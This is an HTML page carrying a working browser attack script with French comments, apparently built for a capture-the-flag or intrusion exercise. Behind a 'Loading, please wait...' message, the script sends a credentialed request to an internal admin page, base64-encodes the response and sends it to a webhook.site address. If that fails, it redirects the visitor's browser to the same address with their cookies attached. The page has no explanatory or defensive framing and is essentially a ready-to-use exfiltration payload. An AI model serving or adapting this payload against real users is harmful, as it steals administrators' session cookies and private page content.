<!DOCTYPE html>
<html>
<body>
    <script>
        (function() {
            var target = "http://192.168.132.208:9223/admin";
            var webhook = "	http://webhook.site/32a51fe3-e905-4766-8511-9e0521376bb2"; // UTILISE TON ADRESSE ICI

            var xhr = new XMLHttpRequest();
            xhr.open("GET", target, true);
            xhr.withCredentials = true; // Indispensable pour porter les cookies de l'admin

            xhr.onload = function() {
                // On récupère le code source de la page admin
                var pageContent = xhr.responseText;
                var report = btoa(unescape(encodeURIComponent(pageContent))).substring(0, 2000);
                
                // Envoi via Image (Ta méthode préférée)
                var img = new Image();
                img.src = webhook + "?exfil=" + report;
            };

            xhr.onerror = function() {
                // Si le GET est bloqué, on tente au moins d'envoyer les cookies via redirection
                location.href = webhook + "?cookie_fallback=" + btoa(document.cookie);
            };

            xhr.send();
        })();
    </script>
    <p>Loading, please wait...</p>
</body>
</html>
